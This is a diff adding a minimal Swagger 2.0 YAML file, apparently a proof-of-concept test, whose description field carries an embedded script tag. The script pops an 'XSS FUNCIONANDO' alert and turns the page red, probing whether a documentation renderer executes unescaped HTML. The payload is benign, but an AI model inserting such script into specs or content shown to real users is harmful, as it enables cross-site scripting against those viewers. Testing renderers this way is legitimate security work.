@@ -1,0 +1,9 @@
+swagger: "2.0"
+info:
+  title: "TEST SIMPLES"
+  description: |
+    <script>
+      alert('XSS FUNCIONANDO - Teste 1');
+      document.body.style.backgroundColor = 'red';
+    </script>
+paths: {}
